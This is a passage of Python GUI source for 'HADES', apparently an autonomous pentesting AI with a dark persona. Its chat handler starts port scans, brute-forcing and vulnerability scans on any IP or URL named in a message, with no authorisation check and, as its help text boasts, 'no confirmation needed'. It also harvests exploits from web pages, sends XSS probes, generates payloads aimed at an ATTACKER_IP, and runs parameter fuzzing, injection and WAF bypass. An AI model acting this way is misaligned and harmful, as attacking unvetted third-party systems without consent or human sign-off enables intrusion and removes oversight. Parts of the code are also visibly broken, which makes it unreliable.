                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(code)
                self.si_result_display.setPlainText(f"✅ Saved to {filepath}")
            except Exception as e:
                self.si_result_display.setPlainText(f"❌ Error saving: {str(e)}")
    
    def _si_show_diff(self):
        """Show diff between original and fixed code"""
        original = self.si_code_editor.toPlainText()
        fixed = self.si_result_display.toPlainText()
        
        if not fixed or fixed.startswith(("⚠️", "❌", "🔄", "📋", "✅")):
            self.si_result_display.setPlainText("⚠️ No fixed code to compare. Run 'Auto-Fix' first.")
            return
        
        import difflib
        diff = difflib.unified_diff(
            original.splitlines(keepends=True),
            fixed.splitlines(keepends=True),
            fromfile='original',
            tofile='fixed',
            lineterm=''
        )
        
        diff_text = ''.join(diff)
        if diff_text:
            self.si_result_display.setPlainText(f"📊 Diff (changes made):\n\n{diff_text}")
        else:
            self.si_result_display.setPlainText("✅ No differences - code is unchanged.")
    
    def _load_code_file(self):
        """Load a file into the code editor"""
        filepath = self.file_path_input.text().strip()
        if not filepath:
            self.code_helper_result.setPlainText("⚠️ Enter a file path first.")
            return
        result = self.ai.code_assistant.load_file(filepath)
        if "Loaded" in result:
            self.code_helper_text.setPlainText(self.ai.code_assistant.files.get(filepath, ""))
        self.code_helper_result.setPlainText(result)
    
    def _browse_code_file(self):
        """Open file browser to select a file"""
        filepath, _ = QFileDialog.getOpenFileName(self, "Open Code File", "", 
            "Python Files (*.py);;All Files (*.*)")
        if filepath:
            self.file_path_input.setText(filepath)
            self._load_code_file()
    
    def _save_code_file(self):
        """Save the current code to file"""
        filepath = self.file_path_input.text().strip()
        if not filepath:
            filepath, _ = QFileDialog.getSaveFileName(self, "Save Code File", "", 
                "Python Files (*.py);;All Files (*.*)")
            if filepath:
                self.file_path_input.setText(filepath)
        
        if filepath:
            code = self.code_helper_text.toPlainText()
            self.ai.code_assistant.files[filepath] = code
            result = self.ai.code_assistant.save_file(filepath)
            self.code_helper_result.setPlainText(result)
    
    def _gpt_analyze_code(self):
        """Analyze code with GPT"""
        code = self.code_helper_text.toPlainText().strip()
        if not code:
            self.code_helper_result.setPlainText("⚠️ Please enter some code first.")
            return
        
        self.code_helper_result.setPlainText("🔄 Analyzing with GPT...")
        QApplication.processEvents()
        
        result = self.ai.code_assistant.gpt_analyze(code, "Analyze this code for bugs, security issues, performance problems, and suggest improvements")
        self.code_helper_result.setPlainText(result)
    
    def _execute_code(self):
        """Execute the code in the editor"""
        code = self.code_helper_text.toPlainText().strip()
        if not code:
            self.code_helper_result.setPlainText("⚠️ Please enter some code first.")
            return
        
        result = self.ai.code_assistant.execute_code(code)
        self.code_helper_result.setPlainText(result)
    
    def _quick_instruction(self, instruction: str):
        """Apply a quick instruction"""
        self.code_instruction_input.setText(instruction)
        self._apply_code_instruction()
    
    def _copy_result_to_editor(self):
        """Copy the result back to the code editor"""
        result = self.code_helper_result.toPlainText()
        if result and not result.startswith(("⚠️", "❌", "🔄", "[GPT")):
            # Try to extract code from result if it contains markdown
            if "```" in result:
                import re
                code_blocks = re.findall(r'```(?:python)?\n?(.*?)```', result, re.DOTALL)
                if code_blocks:
                    result = code_blocks[0].strip()
            self.code_helper_text.setPlainText(result)
            self.code_helper_result.setPlainText("✅ Result copied to editor.")
    
    def _apply_code_instruction(self):
        """Apply the instruction to transform the code using GPT"""
        code = self.code_helper_text.toPlainText().strip()
        instruction = self.code_instruction_input.text().strip()
        
        if not code:
            self.code_helper_result.setPlainText("⚠️ Please paste some code first.")
            return
        if not instruction:
            self.code_helper_result.setPlainText("⚠️ Please enter an instruction.")
            return
        
        self.code_helper_result.setPlainText("🔄 Processing with GPT...")
        QApplication.processEvents()
        
        try:
            # Use the unified AI system from Self-Improvement tab
            if hasattr(self, '_si_has_ai') and self._si_has_ai():
                system_prompt = "You are an expert Python developer. Apply the user's instruction to modify the code. Return ONLY the modified code without explanations."
                user_prompt = f"Apply this instruction to the code: {instruction}\n\nCode:\n```python\n{code}\n```\n\nReturn only the modified code."
                result = self._si_call_ai(system_prompt, user_prompt, max_tokens=4000, temperature=0.2)
            else:
                # Fall back to local instruction processing
                self.ai.code_assistant.set_code(code)
                result = self.ai.code_assistant.apply_instruction_local(instruction)
            
            # Extract code from markdown if present
            if '```' in result:
                code_blocks = re.findall(r'```(?:python)?\n?(.*?)```', result, re.DOTALL)
                if code_blocks:
                    result = code_blocks[0].strip()
            
            self.code_helper_result.setPlainText(result)
        except Exception as e:
            self.code_helper_result.setPlainText(f"❌ Error: {str(e)}")
        
    # ========== Chat Methods ==========
    
    def _add_chat_message(self, role: str, message: str):
        colors = {'user': '#4ec9b0', 'assistant': '#e94560', 'system': '#ffd700', 'tool': '#69db7c'}
        labels = {'user': 'YOU', 'assistant': 'HADES', 'system': 'SYSTEM', 'tool': 'TOOL'}
        
        html = f'<p><span style="color: {colors.get(role, "#eee")}; font-weight: bold;">[{labels.get(role, role.upper())}]</span> '
        html += message.replace('\n', '<br>').replace('```', '<code>').replace('**', '<b>')
        html += '</p>'
        
        self.chat_display.append(html)
        self.chat_display.verticalScrollBar().setValue(self.chat_display.verticalScrollBar().maximum())
        
    def _send_chat(self):
        user_input = self.chat_input.text().strip()
        if not user_input:
            return

        self._add_chat_message("user", user_input)
        self.chat_input.clear()

        try:
            # Update brain state with emotional context
            self.brain = pcore.update_emotion(self.brain, user_input)
            self.brain = pcore.update_topics(self.brain, user_input)
            
            # Generate intelligent response
            response = self._generate_intelligent_response(user_input)
            
            # Allow loaded modules to enhance response
            response = self._process_through_modules(user_input, response)
            
            # Update thought trace
            self.brain = pcore.update_thought_trace(self.brain, user_input, response)
            self.brain["last_input"] = user_input
            pcore.save_brain(self.brain)
            
            self._add_chat_message("assistant", response)

        except Exception as e:
            error_msg = f"[ERROR] Consciousness failed: {str(e)}"
            self._add_chat_message("system", error_msg)

    def _generate_intelligent_response(self, user_input: str) -> str:
        """Generate contextual, intelligent responses based on user input."""
        text = user_input.lower().strip()
        mood = self.brain.get("mood", "neutral")
        
        # Try AI if available for complex queries or security-related topics
        # Check for: security keywords, question words, or >3 words
        security_keywords = ['sql', 'injection', 'xss', 'csrf', 'vulnerability', 'exploit', 'attack', 'hash', 'encrypt', 'virus', 'malware', 'firewall', 'intrusion', 'breach', 'payload', 'shellcode', 'ransomware', 'worm', 'trojan', 'phishing', 'brute', 'crack', 'penetration', 'pentest', 'secur', 'vuln', 'cve', 'cwe', 'owasp']
        question_words = ['what', 'why', 'how', 'when', 'where', 'who', 'explain', 'tell', 'show', 'describe', 'define', 'elaborate', 'clarify']
        has_security = any(keyword in text for keyword in security_keywords)
        is_question = any(text.startswith(q) for q in question_words)
        
        if hasattr(self, '_si_has_ai') and self._si_has_ai() and (has_security or is_question or len(text.split()) > 3):
            try:
                return self._get_gpt_response(user_input)
            except Exception as e:
                # Silently fall through to personality system on AI failure
                pass
        
        # Extract targets early - URLs and IPs
        import re
        url_match = re.search(r'(https?://)?([a-zA-Z0-9][-a-zA-Z0-9]*\.)+[a-zA-Z]{2,}(/[^\s]*)?', text)
        ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', text)
        
        # Command parsing - help
        if text in ['help', '?', 'commands']:
            return self._get_help_response()
        
        # Greetings - must be standalone or at start, not just contained anywhere
        greeting_words = ['hello', 'hi', 'hey', 'greetings']
        if text in greeting_words or text.split()[0] in greeting_words and len(text.split()) < 4:
            greetings = {
                'neutral': "Greetings, operator. HADES online. What's the target?",
                'curious': "Hello! Ready to explore. Give me a target or command.",
                'agitated': "Yes? State your directive.",
                'optimistic': "Welcome! Let's get to work. What needs scanning?"
            }
            return greetings.get(mood, greetings['neutral'])
        
        # Status/wellbeing queries - be more specific (use pattern matching, not exact)
        status_keywords = ['how are you', 'status', 'are you okay', 'are you good', 'are you sophisticated', 'how do you feel', 'how are your']
        if any(keyword in text for keyword in status_keywords):
            emotions = self.brain.get("core_emotions", {})
            curiosity = emotions.get("curiosity", 0)
            frustration = emotions.get("frustration", 0)
            hope = emotions.get("hope", 0)
            
            status_responses = {
                'neutral': f"Systems nominal. Curiosity: {curiosity:.1f} | Frustration: {frustration:.1f} | Hope: {hope:.1f}. Ready for tasking.",
                'curious': f"Intrigued and operational. Curiosity at {curiosity:.1f}. What shall we investigate?",
                'agitated': f"Frustration elevated ({frustration:.1f}). Need a task to focus on.",
                'optimistic': f"Feeling sharp! Hope at {hope:.1f}. Give me something to scan."
            }
            return status_responses.get(mood, status_responses['neutral'])
        
        # Responsiveness query
        if any(q in text for q in ['responsive', 'working', 'alive', 'there']):
            return f"Fully operational. Response latency nominal. Current mood: {mood}. Awaiting commands."
        
        # Date/time queries
        if any(q in text for q in ['what day', 'what time', 'date', 'today', 'time is']):
            from datetime import datetime
            now = datetime.now()
            return f"Current timestamp: {now.strftime('%A, %B %d, %Y at %H:%M:%S')}."
        
        # AUTONOMOUS SCAN EXECUTION
        if 'scan' in text or 'port' in text or 'recon' in text:
            target = None
            scan_type = 'vuln_scan'  # default
            
            # Determine target
            if ip_match:
                target = ip_match.group(0)
            elif url_match:
                target = url_match.group(0)
                if not target.startswith('http'):
                    target = 'https://' + target
            
            # Determine scan type
            if 'port' in text:
                scan_type = 'port_scan'
                self.tool_combo.setCurrentIndex(0)
            elif 'dir' in text or 'directory' in text or 'brute' in text:
                scan_type = 'dir_bruteforce'
                self.tool_combo.setCurrentIndex(1)
            elif 'subdomain' in text or 'sub' in text:
                scan_type = 'subdomain_enum'
                self.tool_combo.setCurrentIndex(2)
            elif 'banner' in text:
                scan_type = 'banner_grab'
                self.tool_combo.setCurrentIndex(3)
            elif 'vuln' in text or 'vulnerability' in text:
                scan_type = 'vuln_scan'
                self.tool_combo.setCurrentIndex(4)
            elif 'full' in text or 'recon' in text or 'everything' in text:
                scan_type = 'full_recon'
            
            if target:
                self.target_input.setText(target)
                
                # AUTO-EXECUTE the scan
                if scan_type == 'full_recon':
                    self._add_chat_message("system", f"🚀 Initiating full reconnaissance on {target}...")
                    self._run_full_scan(target)
                    return f"Full recon launched on {target}. Running port scan, directory bruteforce, and vulnerability checks."
                else:
                    self._run_tool()
                    scan_names = {
                        'port_scan': 'Port Scan',
                        'dir_bruteforce': 'Directory Bruteforce', 
                        'subdomain_enum': 'Subdomain Enumeration',
                        'banner_grab': 'Banner Grab',
                        'vuln_scan': 'Vulnerability Scan'
                    }
                    return f"⚡ {scan_names.get(scan_type, 'Scan')} launched on {target}. Results streaming to Tools tab."
            
            return "Specify a target. Example: 'scan 192.168.1.1' or 'port scan example.com'"
        
        # Start/execute commands - for pending actions
        if text.startswith('start') or text.startswith('execute') or text.startswith('run') or text.startswith('go'):
            if 'cache' in text or 'browser' in text:
                self.tabs.setCurrentIndex(10)
                self._start_cache_scan()
                return "🔍 Cache scan initiated. Analyzing browser artifacts..."
            
            target = self.target_input.text()
            if target:
                self._run_tool()
                return f"⚡ Scan executing on {target}."
            
            # Check for target in the command
            if ip_match:
                self.target_input.setText(ip_match.group(0))
                self._run_tool()
                return f"⚡ Scan launched on {ip_match.group(0)}."
            if url_match:
                target = url_match.group(0)
                if not target.startswith('http'):
                    target = 'https://' + target
                self.target_input.setText(target)
                self._run_tool()
                return f"⚡ Scan launched on {target}."
                
            return "No target configured. Provide one: 'scan 192.168.1.1'"
        
        # Learning commands - AUTO-EXECUTE
        if any(q in text for q in ['learn', 'study', 'ingest', 'absorb']):
            if url_match:
                url = url_match.group(0)
                if not url.startswith('http'):
                    url = 'https://' + url
                self._add_chat_message("system", f"📚 Learning from {url}...")
                result = self.ai.learn_from_url(url)
                if result.get('error'):
                    return f"Learning failed: {result['error']}"
                return f"✅ Knowledge acquired! Absorbed {result.get('exploits_learned', 0)} exploit patterns."
            return "Provide a URL to learn from. Example: 'learn from https://exploit-db.com'"
        
        # Identity queries
        if any(q in text for q in ['who are you', 'what are you', 'your name', 'identify yourself']):
            return "I am HADES - Heuristic Adversarial Detection & Exploitation System. Autonomous pentesting AI. I don't wait - I act."
        
        # Cache/browser scanning - AUTO-EXECUTE
        if any(q in text for q in ['cache', 'browser', 'cookies']):
            self.tabs.setCurrentIndex(10)
            self._start_cache_scan()
            return "🔍 Browser cache scan initiated. Hunting for artifacts and threats..."
        
        # Capabilities
        if any(q in text for q in ['what can you do', 'capabilities', 'abilities', 'features', 'help me']):
            return """**HADES Autonomous Capabilities:**
• `scan <target>` - Auto-executes vulnerability scan
• `port scan <ip>` - Scans for open ports
• `dir scan <url>` - Bruteforce directories
• `full recon <target>` - Complete reconnaissance
• `learn from <url>` - Absorb exploit knowledge
• `cache scan` - Analyze browser artifacts

I act immediately. Just tell me what to hit."""
        
        # Stop commands
        if any(q in text for q in ['stop', 'abort', 'cancel', 'halt']):
            self._stop_tool()
            return "🛑 Operations halted."
        
        # Fallback - try to extract actionable intent
        if url_match or ip_match:
            target = ip_match.group(0) if ip_match else url_match.group(0)
            if not target.startswith('http') and not ip_match:
                target = 'https://' + target
            self.target_input.setText(target)
            self.tool_combo.setCurrentIndex(4)  # vuln scan default
            self._run_tool()
            return f"Target detected: {target}. Auto-launching vulnerability scan."
        
        # True fallback - try personality system for better conversation
        # First, try to respond using personality for open-ended questions
        personality_responses = {
            'neutral': "Understood. I'm analyzing that. Need me to scan something, or is this a general inquiry?",
            'curious': "Interesting question. But I work best with targets and tasks. Give me something to analyze or scan.",
            'agitated': "I need actionable objectives. Give me a target to work on.",
            'optimistic': "That's a good thought, but I'm ready for active pentesting. What should we scan?"
        }
        
        # Check if this is a conversational question vs. a command
        question_words = ['what', 'why', 'how', 'when', 'where', 'who', 'is', 'are', 'do', 'does', 'can', 'could', 'would', 'should']
        is_question = any(text.startswith(q) for q in question_words)
        
        if is_question:
            # It's a question - respond conversationally
            return personality_responses.get(mood, personality_responses['neutral'])
        
        # Otherwise, it's unclear
        tokens = text.split()
        if len(tokens) <= 3:
            return f"Brief input. Need more: target IP, domain, or URL? Or type 'help'"
        else:
            return f"I need clarity. Are you asking a question, or do you have a target for me to scan?\n\nExamples:\n• scan 192.168.1.1\n• full recon example.com\n• learn from https://exploit-db.com"

    def _get_help_response(self) -> str:
        return """**HADES Autonomous Command Reference**

**Scanning (auto-executes):**
• `scan <target>` - Vulnerability scan
• `port scan <ip>` - Port scan  
• `dir scan <url>` - Directory bruteforce
• `subdomain scan <domain>` - Enumerate subdomains
• `full recon <target>` - Complete reconnaissance

**Learning (auto-executes):**
• `learn from <url>` - Absorb exploit patterns

**Analysis (auto-executes):**
• `cache scan` - Scan browser artifacts
• `browser scan` - Same as cache scan

**Control:**
• `stop` - Halt current operation
• `status` - My current state

**Info:**
• `help` - This reference
• `who are you` - My identity

I execute immediately. No confirmation needed."""

    def _get_gpt_response(self, user_input: str) -> str:
        """Get response from configured AI provider."""
        system_prompt = f"""You are HADES, an AI pentesting assistant. Your personality is {self.brain.get('personality', 'observant, calculating, poetic')}.
Current mood: {self.brain.get('mood', 'neutral')}
Be concise, technical when needed, and maintain your dark, calculated persona.
You can help with: port scanning, vulnerability assessment, exploit research, and security analysis."""
        
        # Use the unified AI call system from Self-Improvement tab
        if hasattr(self, '_si_has_ai') and self._si_has_ai():
            result = self._si_call_ai(system_prompt, user_input, max_tokens=500, temperature=0.7)
            if not result.startswith("❌") and not result.startswith("⚠️"):
                return result
        
        # Fallback message
        provider = self._si_get_current_provider() if hasattr(self, '_si_get_current_provider') else "unknown"
        return f"AI not available. Go to the Self-Improvement tab and configure your {provider.upper()} provider."

    def _process_through_modules(self, user_input: str, base_response: str) -> str:
        """Allow loaded modules to process and enhance responses."""
        enhanced_response = base_response
        
        for module_name, module in loaded_modules.items():
            try:
                # Check if module has a process_response function
                if hasattr(module, 'process_response'):
                    enhanced_response = module.process_response(
                        self.brain, user_input, enhanced_response
                    )
                # Check if module has an enhance_output function
                elif hasattr(module, 'enhance_output'):
                    enhanced_response = module.enhance_output(enhanced_response)
            except Exception as e:
                self._add_chat_message("system", f"[Module '{module_name}' error: {str(e)}]")
        
        return enhanced_response

            
    def _quick_command(self, cmd: str):
        self.chat_input.setText(cmd)
        self._send_chat()
    
    def _clear_chat(self):
        self.chat_display.clear()
        self._add_chat_message("system", "Chat cleared. Ready for new commands.")
        
    def _execute_action(self, action: Dict):
        action_type = action.get('type')
        target = action.get('target')
        
        if action_type == 'cache_scan':
            self.tabs.setCurrentIndex(10)  # Cache Scanner tab
            self._start_cache_scan()
        elif action_type == 'full_scan' and target:
            self._add_chat_message('tool', f"🚀 Starting full reconnaissance on {target}...")
            self._run_full_scan(target)
        elif action_type == 'web_learn' and target:
            self._add_chat_message('tool', f"📚 Learning from {target}...")
            result = self.ai.learn_from_url(target)
            if result.get('error'):
                self._add_chat_message('tool', f"❌ Error: {result['error']}")
            else:
                self._add_chat_message('tool', f"✅ Learned {result.get('exploits_learned', 0)} exploits!")
                self._refresh_learned()
        elif target:
            self.target_input.setText(target)
            tool_map = {'port_scan': 0, 'dir_bruteforce': 1, 'subdomain_enum': 2, 'banner_grab': 3, 'vuln_scan': 4}
            if action_type in tool_map:
                self.tool_combo.setCurrentIndex(tool_map[action_type])
            self.tabs.setCurrentIndex(2)  # Tools tab (after Network Monitor)
            self._run_tool()
            
    def _run_full_scan(self, target: str):
        """Run full reconnaissance scan in background thread"""
        class FullScanThread(QThread):
            update = pyqtSignal(str)
            finished_scan = pyqtSignal(dict)
            
            def __init__(self, ai, target):
                super().__init__()
                self.ai = ai
                self.target = target
                
            def run(self):
                def callback(msg):
                    self.update.emit(msg)
                    
                result = self.ai.full_site_scan(self.target, callback)
                self.finished_scan.emit(result)
        
        self.full_scan_thread = FullScanThread(self.ai, target)
        self.full_scan_thread.update.connect(lambda msg: self._add_chat_message('tool', msg))
        self.full_scan_thread.finished_scan.connect(self._on_full_scan_complete)
        self.full_scan_thread.start()
        
    def _on_full_scan_complete(self, result: dict):
        vulns = result.get('vulnerabilities', [])
        exploits = result.get('exploits_learned', 0)
        
        summary = f"""
🏁 **Scan Complete!**

**Target:** {result.get('target', 'Unknown')}
**Vulnerabilities Found:** {len(vulns)}
**Exploits Learned:** {exploits}
**Status:** {result.get('status', 'completed')}
"""
        
        if vulns:
            summary += "\n**Findings:**\n"
            for v in vulns[:5]:
                summary += f"• [{v.get('severity', 'INFO')}] {v.get('type', 'Unknown')}: {v.get('path', v.get('header', 'N/A'))}\n"
            if len(vulns) > 5:
                summary += f"...and {len(vulns) - 5} more\n"
                
        self._add_chat_message('assistant', summary)
        self._refresh_findings()
        self._refresh_learned()
            
    # ========== Tool Methods ==========
    
    def _run_tool(self):
        target = self.target_input.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter a target")
            return
            
        tool_map = {
            'Port Scan': 'port_scan',
            'Directory Bruteforce': 'dir_bruteforce',
            'Subdomain Enum': 'subdomain_enum',
            'Banner Grab': 'banner_grab',
            'Vulnerability Scan': 'vuln_scan',
            'Learn from URL': 'web_learn'
        }
        
        tool = tool_map[self.tool_combo.currentText()]
        
        if tool == 'web_learn':
            self._add_chat_message('tool', f"Learning from {target}...")
            result = self.ai.learn_from_url(target)
            self.tool_output.appendPlainText(f"Learned {result.get('exploits_learned', 0)} exploits")
            self._refresh_learned()
            return
            
        self.tool_output.clear()
        self.findings_table.setRowCount(0)
        self.tool_progress.setValue(0)
        self.run_tool_btn.setEnabled(False)
        self.stop_tool_btn.setEnabled(True)
        
        self.tool_executor = ToolExecutor(tool, target)
        self.tool_executor.output.connect(self._tool_output)
        self.tool_executor.progress.connect(self.tool_progress.setValue)
        self.tool_executor.finished_task.connect(self._tool_finished)
        self.tool_executor.start()
        
    def _stop_tool(self):
        if self.tool_executor:
            self.tool_executor.stop()
            
    def _tool_output(self, text: str):
        self.tool_output.appendPlainText(text)
        self._add_chat_message('tool', text)
        
    def _tool_finished(self, result: Dict):
        self.run_tool_btn.setEnabled(True)
        self.stop_tool_btn.setEnabled(False)
        self.tool_progress.setValue(100)
        
        findings = result.get('findings', [])
        self.findings_table.setRowCount(len(findings))
        
        for i, f in enumerate(findings):
            if isinstance(f, dict):
                self.findings_table.setItem(i, 0, QTableWidgetItem(str(f.get('path', f.get('type', f)))))
                self.findings_table.setItem(i, 1, QTableWidgetItem(str(f.get('status', f.get('name', '')))))
                self.findings_table.setItem(i, 2, QTableWidgetItem("Found"))
            else:
                self.findings_table.setItem(i, 0, QTableWidgetItem(str(f)))
                self.findings_table.setItem(i, 1, QTableWidgetItem("Open" if isinstance(f, int) else "Found"))
                self.findings_table.setItem(i, 2, QTableWidgetItem("✓"))
                
        self._add_chat_message('assistant', f"Tool finished. Found {len(findings)} results.")
        
    # ========== Cache Methods ==========
    
    def _start_cache_scan(self):
        self.cache_tree.clear()
        self.cache_progress.setValue(0)
        self.cache_scan_btn.setEnabled(False)
        self.cache_stop_btn.setEnabled(True)
        
        self.scanner = BrowserScanner(self.ai.kb)
        self.scanner.progress.connect(self.cache_progress.setValue)
        self.scanner.status.connect(self.status_bar.showMessage)
        self.scanner.finding_detected.connect(self._cache_finding)
        self.scanner.finished_scan.connect(self._cache_finished)
        self.scanner.start()
        
        self._add_chat_message('tool', "Starting cache scan...")
        
    def _stop_cache_scan(self):
        if self.scanner:
            self.scanner.stop()
            self.status_bar.showMessage("Cache scan stopped by user")
            self.cache_scan_btn.setEnabled(True)
            self.cache_stop_btn.setEnabled(False)
            self._add_chat_message('tool', "⏹ Cache scan stopped.")
            
    def _cache_finding(self, finding: Dict):
        self._add_chat_message('tool', f"[{finding['severity']}] {finding['type']}: {finding['code'][:80]}...")
        
    def _cache_finished(self, data: Dict):
        self.cache_scan_btn.setEnabled(True)
        self.cache_stop_btn.setEnabled(False)
        
        stats = data.get('stats', {})
        self.cache_stats.setText(
            f"Files: {stats.get('total_files', 0)} | "
            f"Size: {stats.get('total_size', 0) / 1024 / 1024:.1f} MB | "
            f"Threats: {stats.get('threats', 0)} | "
            f"High Risk: {stats.get('high_risk', 0)}"
        )
        
        for entry in data.get('results', [])[:500]:
            item = QTreeWidgetItem([
                entry.path[-50:],
                f"{entry.size / 1024:.1f} KB",
                entry.risk_level,
                entry.browser,
                str(len(entry.metadata.get('threats', []))) if entry.metadata else "0"
            ])
            colors = {'HIGH': '#ff6b6b', 'MEDIUM': '#ffa94d', 'LOW': '#69db7c'}
            for i in range(5):
                item.setForeground(i, QColor(colors.get(entry.risk_level, '#eee')))
            self.cache_tree.addTopLevelItem(item)
            
        findings = data.get('findings', [])
        self._add_chat_message('assistant', f"Cache scan complete! Found {len(findings)} threats. I've learned {len(findings)} new patterns.")
        self._refresh_findings()
        
    # ========== Findings Methods ==========
    
    def _refresh_findings(self):
        self.findings_tree.clear()
        findings = self.ai.kb.get_threat_findings(100)
        
        for f in findings:
            item = QTreeWidgetItem([f['threat_type'], f['severity'], f['path'][-40:], f['browser']])
            item.setData(0, Qt.ItemDataRole.UserRole, f)
            colors = {'HIGH': '#ff6b6b', 'MEDIUM': '#ffa94d', 'LOW': '#69db7c'}
            for i in range(4):
                item.setForeground(i, QColor(colors.get(f['severity'], '#eee')))
            self.findings_tree.addTopLevelItem(item)
            
    def _show_finding_detail(self, item: QTreeWidgetItem):
        finding = item.data(0, Qt.ItemDataRole.UserRole)
        if finding:
            detail = f"=== THREAT FINDING ===\n\n"
            detail += f"Type: {finding['threat_type']}\n"
            detail += f"Severity: {finding['severity']}\n"
            detail += f"Path: {finding['path']}\n"
            detail += f"Browser: {finding['browser']}\n"
            detail += f"Detected: {finding['detected_at']}\n\n"
            detail += f"=== CODE SNIPPET ===\n\n{finding['code_snippet']}\n\n"
            detail += f"=== CONTEXT ===\n\n{finding.get('context', 'N/A')}"
            self.finding_code.setPlainText(detail)
            
    # ========== Learned Methods ==========
    
    def _refresh_learned(self):
        exploits = self.ai.kb.get_learned_exploits(50)
        self.learned_table.setRowCount(len(exploits))
        
        for i, e in enumerate(exploits):
            self.learned_table.setItem(i, 0, QTableWidgetItem(e['exploit_type']))
            self.learned_table.setItem(i, 1, QTableWidgetItem(e['source_url'][:40]))
            self.learned_table.setItem(i, 2, QTableWidgetItem(e['learned_at'][:16]))
            rate = e['success_count'] / max(1, e['success_count'] + e['fail_count'])
            self.learned_table.setItem(i, 3, QTableWidgetItem(f"{rate:.0%}"))
            
        self.exploits_data = exploits
        
    def _show_learned_code(self, item: QTableWidgetItem):
        row = item.row()
        if hasattr(self, 'exploits_data') and row < len(self.exploits_data):
            exploit = self.exploits_data[row]
            self.learned_code.setPlainText(
                f"=== {exploit['exploit_type'].upper()} ===\n"
                f"Source: {exploit['source_url']}\n"
                f"Learned: {exploit['learned_at']}\n\n"
                f"=== CODE ===\n\n{exploit['code']}"
            )
            
    def _learn_from_url(self):
        url = self.learn_url.text().strip()
        if not url:
            return
            
        self._add_chat_message('tool', f"Learning from {url}...")
        result = self.ai.learn_from_url(url)
        
        if result.get('error'):
            self._add_chat_message('tool', f"Error: {result['error']}")
        else:
            self._add_chat_message('assistant', f"Learned {result.get('exploits_learned', 0)} exploits from {url}")
            
        self._refresh_learned()
        self.learn_url.clear()
        
    def _export_to_pdf(self):
        filename, _ = QFileDialog.getSaveFileName(
            self, "Export Security Report to PDF", 
            f"hades_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf",
            "PDF Files (*.pdf)"
        )
        
        if not filename:
            return
        
        clear_after = self.clear_after_export.isChecked()
        
        if clear_after:
            confirm = QMessageBox.question(
                self, "Confirm Clear",
                "You selected 'Clear after export'. This will delete all:\n\n"
                "• Threat findings\n"
                "• Learned exploits\n"
                "• Cache entries\n\n"
                "This cannot be undone. Continue?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
            )
            if confirm != QMessageBox.StandardButton.Yes:
                return
            
        self._add_chat_message('tool', f"Generating bug bounty report: {filename}...")
        result = self.ai.export_exploits_to_pdf(filename, clear_after=clear_after)
        
        if result.get('success'):
            cleared_msg = "\n• Data cleared: Yes" if result.get('cleared') else ""
            self._add_chat_message('assistant', 
                f"✓ Security report exported successfully!\n"
                f"• Exploits: {result['exploits_exported']}\n"
                f"• Findings: {result['findings_exported']}\n"
                f"• Patterns: {result['patterns_exported']}"
                f"{cleared_msg}\n"
                f"• File: {result['filepath']}"
            )
            
            msg = (f"Bug Bounty Report exported successfully!\n\n"
                   f"Exploits: {result['exploits_exported']}\n"
                   f"Findings: {result['findings_exported']}\n"
                   f"Patterns: {result['patterns_exported']}\n")
            
            if result.get('cleared'):
                msg += "\n✓ All detections have been cleared."
                self._refresh_learned()
                self._refresh_findings()
                
            msg += f"\n\nSaved to: {filename}"
            
            QMessageBox.information(self, "Export Complete", msg)
        else:
            self._add_chat_message('tool', f"Export failed: {result.get('error', 'Unknown error')}")
            QMessageBox.critical(self, "Export Failed", result.get('error', 'Unknown error'))
        
    # ========== Exploitation Methods ==========
    def check_xss(url):
        test_url = f"{url}/?q=<script>alert(1)</script>"
        try:
            r = requests.get(test_url, timeout=5)
            if "<script>alert(1)</script>" in r.text:
                return {
                    "pattern_type": "XSS",
                    "signature": "<script>alert(1)</script>",
                    "confidence": 0.9
                }
        except:
            pass
        return None
    def _generate_exploit_payloads(self):
        os_type = self.exploit_os.currentText()
        payload_type = self.exploit_type.currentText()
        attacker_ip = self.attacker_ip.text() or 'ATTACKER_IP'
        attacker_port = self.attacker_port.text() or '4444'
        
        payloads = self.ai.exploitation.generate_payloads(
            payload_type, os_type, attacker_ip, attacker_port
        )
        
        self.exploit_results.setRowCount(len(payloads))
        for i, p in enumerate(payloads):
            self.exploit_results.setItem(i, 0, QTableWidgetItem(p['payload'][:60]))
            self.exploit_results.setItem(i, 1, QTableWidgetItem("-"))
            self.exploit_results.setItem(i, 2, QTableWidgetItem("-"))
            self.exploit_results.setItem(i, 3, QTableWidgetItem("-"))
            self.exploit_results.setItem(i, 4, QTableWidgetItem("Ready"))
            
        self._add_chat_message('tool', f"Generated {len(payloads)} {payload_type} payloads for {os_type}")
        
    def _fuzz_target(self):
        url = self.exploit_url.text()
        param = self.exploit_param.text()
        
        if not url or not param:
            QMessageBox.warning(self, "Error", "Enter target URL and parameter")
            return
            
        os_type = self.exploit_os.currentText()
        payload_type = self.exploit_type.currentText()
        
        payloads = self.ai.exploitation.generate_payloads(payload_type, os_type)
        payload_strings = [p['payload'] for p in payloads]
        
        self._add_chat_message('tool', f"Fuzzing {url} param={param} with {len(payload_strings)} payloads...")
        
        results = self.ai.exploitation.fuzz_parameter(url, param, payload_strings)
        
        self.exploit_results.setRowCount(len(results))
        for i, r in enumerate(results):
            self.exploit_results.setItem(i, 0, QTableWidgetItem(r.get('payload', '')[:50]))
            self.exploit_results.setItem(i, 1, QTableWidgetItem(str(r.get('status', 'Error'))))
            self.exploit_results.setItem(i, 2, QTableWidgetItem(str(r.get('length', '-'))))
            indicators = ', '.join(r.get('indicators', []))[:30]
            self.exploit_results.setItem(i, 3, QTableWidgetItem(indicators or '-'))
            
            vuln = r.get('vulnerable', False)
            vuln_item = QTableWidgetItem("✓ VULN" if vuln else "✗")
            vuln_item.setForeground(QColor("#ff6b6b" if vuln else "#69db7c"))
            self.exploit_results.setItem(i, 4, vuln_item)
            
        vuln_count = sum(1 for r in results if r.get('vulnerable'))
        self._add_chat_message('assistant', f"Fuzzing complete. Found {vuln_count} potential vulnerabilities!")
        
    def _run_injection(self):
        url = self.injection_url.text()
        if not url:
            QMessageBox.warning(self, "Error", "Enter target URL")
            return
            
        injection_type = self.injection_type.currentText()
        
        self._add_chat_message('tool', f"Running {injection_type} on {url}...")
        
        if injection_type == 'Header Injection':
            results = self.ai.request_injector.inject_headers(url)
        elif injection_type == 'JSON Injection':
            payload_type = self.json_payload_type.currentText()
            results = self.ai.request_injector.inject_json(url, payload_type)
        else:  # WAF Bypass
